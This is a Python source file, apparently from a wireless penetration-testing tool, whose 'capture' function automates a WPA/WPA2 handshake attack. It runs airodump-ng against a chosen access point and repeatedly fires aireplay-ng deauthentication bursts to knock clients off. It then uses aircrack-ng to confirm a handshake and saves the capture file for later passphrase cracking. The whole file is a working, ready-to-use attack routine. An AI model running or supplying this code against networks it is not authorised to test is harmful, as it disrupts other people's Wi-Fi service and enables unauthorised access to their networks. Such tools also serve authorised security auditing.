# -*- coding: utf-8 -*-
"""WPA/WPA2 handshake capture — airodump-ng + aireplay-ng, structured detection.

No stdout scraping of a wrapper: airodump writes a pcap, and we confirm the
handshake by running aircrack-ng against it non-interactively.
"""
import os
import re
import subprocess
import time

import config
from attack import tools
from attack.model import AttackEvent, EventType


def _safe(name):
    return re.sub(r"[^A-Za-z0-9_-]", "_", (name or "unknown"))[:24]


def _has_handshake(cap_path, bssid):
    """True if `cap_path` contains a WPA handshake for `bssid`.

    `-w /dev/null` gives aircrack a (empty) wordlist so it runs non-interactively
    and prints the handshake count in its header instead of prompting."""
    if not os.path.exists(cap_path):
        return False
    res = tools.run([tools.AIRCRACK, "-a", "2", "-w", "/dev/null",
                     "-b", bssid, cap_path], timeout=20)
    if not res:
        return False
    out = (res.stdout or "") + (res.stderr or "")
    return bool(re.search(r"\(\s*[1-9]\d*\s+handshake", out, re.I) or
                re.search(r"[1-9]\d*\s+handshake", out, re.I))


def capture(mon, target, req, emit, stop_flag):
    """Capture a handshake for one target.

    target: {"essid","bssid","channel"}. Returns {"ok","cap","essid","bssid"}.
    """
    bssid = target["bssid"]
    essid = target.get("essid") or bssid
    channel = str(target.get("channel") or "")
    os.makedirs(config.CAPTURE_DIR, exist_ok=True)
    prefix = os.path.join(config.CAPTURE_DIR, "%s_%s" % (_safe(essid),
                          bssid.replace(":", "")))
    cap = prefix + "-01.cap"
    # Clear stale captures for this prefix so -01 is fresh.
    for old in (cap, prefix + "-01.csv"):
        try:
            os.remove(old)
        except OSError:
            pass

    timeout = config.opt_int(req.timing, "WPA Timeout", 300)
    deauth_on = config.opt_bool(req.attack_modes, "Deauth", True)
    deauth_gap = config.opt_int(req.timing, "Deauth Sec", 10)
    num_deauth = config.opt_int(req.timing, "Num Deauths", 5)

    dump_cmd = [tools.AIRODUMP, "-c", channel or "1", "--bssid", bssid,
                "-w", prefix, "--output-format", "pcap,csv", mon]
    tools.log("wpa capture: %s" % " ".join(dump_cmd))
    try:
        dump = subprocess.Popen(dump_cmd, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
    except Exception as e:  # noqa: BLE001
        tools.log("airodump start failed: %s" % e)
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail="airodump"))
        return {"ok": False, "essid": essid, "bssid": bssid}

    start = time.time()
    last_deauth = 0.0
    try:
        while True:
            if stop_flag and stop_flag.is_set():
                return {"ok": False, "essid": essid, "bssid": bssid,
                        "cancelled": True}
            elapsed = time.time() - start
            remaining = int(timeout - elapsed)
            if remaining <= 0:
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="timeout"))
                return {"ok": False, "essid": essid, "bssid": bssid}

            if deauth_on and deauth_gap and (time.time() - last_deauth) >= deauth_gap:
                tools.run([tools.AIREPLAY, "--deauth", str(num_deauth),
                           "-a", bssid, mon], timeout=8)
                last_deauth = time.time()
                emit(AttackEvent(EventType.DEAUTH, essid=essid, bssid=bssid,
                                 current=num_deauth))

            emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                             phase="WPA Handshake capture",
                             detail="Listening timeout:%02d:%02d" %
                             (remaining // 60, remaining % 60)))

            if _has_handshake(cap, bssid):
                emit(AttackEvent(EventType.HANDSHAKE, essid=essid, bssid=bssid))
                return {"ok": True, "cap": cap, "essid": essid, "bssid": bssid}

            time.sleep(3)
    finally:
        try:
            dump.terminate()
            dump.wait(timeout=3)
        except Exception:  # noqa: BLE001
            try:
                dump.kill()
            except Exception:  # noqa: BLE001
                pass
